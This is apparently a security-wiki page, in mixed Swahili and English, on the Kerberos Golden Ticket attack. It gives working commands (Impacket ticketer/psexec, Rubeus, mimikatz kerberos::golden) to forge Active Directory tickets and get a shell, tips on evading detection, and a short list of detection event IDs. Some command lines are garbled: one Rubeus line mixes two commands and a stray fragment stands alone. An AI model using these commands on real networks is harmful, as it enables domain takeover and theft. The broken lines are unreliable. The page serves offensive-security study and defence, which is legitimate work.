# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

A **Golden Ticket** attack consist on the **creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user** through the use of the **NTLM hash of the Active Directory (AD) krbtgt account**. Hii mbinu ni faida kubwa kwa sababu inaruhusu **access to any service or machine** ndani ya domain kama mtumiaji anayejulikana. Ni muhimu kukumbuka kwamba **krbtgt account's credentials are never automatically updated**.

Ili **acquire the NTLM hash** ya akaunti ya krbtgt, mbinu mbalimbali zinaweza kutumika. Inaweza kutolewa kutoka kwa **Local Security Authority Subsystem Service (LSASS) process** au **NT Directory Services (NTDS.dit) file** iliyoko kwenye Domain Controller (DC) yoyote ndani ya domain. Zaidi ya hayo, **executing a DCsync attack** ni mkakati mwingine wa kupata NTLM hash hii, ambayo inaweza kufanywa kwa kutumia zana kama **lsadump::dcsync module** katika Mimikatz au **secretsdump.py script** na Impacket. Ni muhimu kusisitiza kwamba ili kufanya operesheni hizi, **domain admin privileges or a similar level of access is typically required**.

Ingawa NTLM hash inatumika kama njia inayofaa kwa ajili ya kusudi hili, inashauriwa **strongly** ku **forge tickets using the Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** kwa sababu za usalama wa operesheni.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe asktgt /user:Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

/rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /ptt
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
**Mara** umepata **tiketi ya dhahabu iliyoingizwa**, unaweza kufikia faili za pamoja **(C$)**, na kutekeleza huduma na WMI, hivyo unaweza kutumia **psexec** au **wmiexec** kupata shell (inaonekana huwezi kupata shell kupitia winrm).

### Kupita njia za kawaida za kugundua

Njia za kawaida zaidi za kugundua tiketi ya dhahabu ni kwa **kukagua trafiki ya Kerberos** kwenye waya. Kwa kawaida, Mimikatz **inasaini TGT kwa miaka 10**, ambayo itajitokeza kama ya kipekee katika maombi ya TGS yanayofanywa nayo.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Tumia vigezo vya `/startoffset`, `/endin` na `/renewmax` kudhibiti mwanzo wa offset, muda na upya wa juu (vyote kwa dakika).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Samahani, muda wa TGT hauandikwi katika 4769, hivyo huwezi kupata taarifa hii katika kumbukumbu za matukio ya Windows. Hata hivyo, kile unachoweza kuhusisha ni **kuona 4769 bila 4768 ya awali**. **Haiwezekani kuomba TGS bila TGT**, na ikiwa hakuna rekodi ya TGT iliyotolewa, tunaweza kudhani kwamba ilitengenezwa nje ya mtandao.

Ili **kuepuka ugunduzi huu** angalia tiketi za almasi:

{{#ref}}
diamond-ticket.md
{{#endref}}

### Kupunguza

- 4624: Kuingia kwa Akaunti
- 4672: Kuingia kwa Admin
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Hila nyingine ndogo ambazo walinzi wanaweza kufanya ni **kuonya kuhusu 4769 kwa watumiaji nyeti** kama akaunti ya msimamizi wa eneo la msingi.

## Marejeleo

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}
